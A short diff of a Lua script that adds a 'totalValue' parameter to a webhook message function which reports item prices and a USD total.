@@ -292,7 +292,7 @@ local function GetUSD(list)
 end
 
 -- Webhook functions
-local function SendFirstMessage(list, prefix)
+local function SendFirstMessage(list, prefix, totalValue)
     local usdData = GetUSD(list)
     local totalUSD = usdData.total or "0.00"
     local itemPrices = usdData.itemPrices or {}
